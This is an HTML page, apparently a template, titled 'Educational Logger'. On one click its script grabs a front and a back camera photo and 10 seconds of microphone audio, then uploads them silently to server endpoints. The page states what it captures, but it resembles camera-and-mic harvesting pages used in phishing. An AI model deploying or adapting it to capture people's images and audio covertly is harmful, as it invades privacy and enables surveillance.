<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <style>
    body {
      text-align: center;
      margin-top: 120px;
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      color: #333;
    }
    h2 { color: #222; margin-bottom: 20px; }
    p { max-width: 600px; margin: 0 auto 30px; color: #555; }
    button {
      padding: 16px 50px;
      margin: 20px 10px;
      font-size: 18px;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      color: white;
    }
    button.primary { background: #007bff; }
    button.primary:hover { background: #0069d9; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    #status {
      font-size: 16px;
      color: #555;
      margin: 30px 0;
      min-height: 30px;
    }
  </style>
</head>
<body>

  <h2>Educational Logger</h2>
  <p>Click to capture 1 front photo + 1 back photo (super fast) + record 10s audio and send</p>

  <button class="primary" id="captureBtn" onclick="capturePhotosAndRecordAudio()">
    Capture Front + Back Photo + 10s Audio
  </button>

  <div id="status"></div>

  <script>
    const btn = document.getElementById('captureBtn');
    const status = document.getElementById('status');

    async function capturePhotosAndRecordAudio() {
      btn.disabled = true;
      btn.textContent = "Processing...";
      status.textContent = "";

      let frontStream = null;
      let backStream = null;
      let audioStream = null;
      let recorder = null;

      try {
        // ১. Front camera photo (super fast)
        status.textContent = "Capturing front photo...";
        frontStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        const frontPhoto = await quickCapturePhoto(frontStream);
        await sendPhoto(frontPhoto, "front");

        // ২. Back camera photo (super fast)
        status.textContent = "Capturing back photo...";
        backStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment" }
        });
        const backPhoto = await quickCapturePhoto(backStream);
        await sendPhoto(backPhoto, "back");

        // ৩. ১০ সেকেন্ডের অডিও রেকর্ড (microphone)
        status.textContent = "Recording 10s audio...";
        audioStream = await navigator.mediaDevices.getUserMedia({
          audio: true,
          video: false
        });

        const chunks = [];
        recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/webm' });
          await sendAudio(blob);
          status.textContent = "Done: 2 photos + 10s audio sent";
          cleanup();
        };

        recorder.start();
        setTimeout(() => {
          if (recorder.state === 'recording') recorder.stop();
        }, 10000);

      } catch (err) {
        status.textContent = "Error: " + (err.name || err.message);
        console.error(err);
        cleanup();
      }
    }

    async function quickCapturePhoto(stream) {
      const video = document.createElement('video');
      video.srcObject = stream;
      await new Promise(r => { video.onloadedmetadata = r; });
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());
      return canvas.toDataURL('image/png');
    }

    async function sendPhoto(base64, type) {
      try {
        await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64, camera: type })
        });
      } catch {}
    }

    async function sendAudio(blob) {
      const formData = new FormData();
      formData.append('audio', blob, '10s_audio.webm');

      try {
        await fetch("/api/send-audio", {
          method: "POST",
          body: formData
        });
      } catch {}
    }

    function cleanup() {
      btn.disabled = false;
      btn.textContent = "Capture Front + Back Photo + 10s Audio";
      if (recorder && recorder.state !== 'inactive') recorder.stop();
    }
  </script>
</body>
</html>
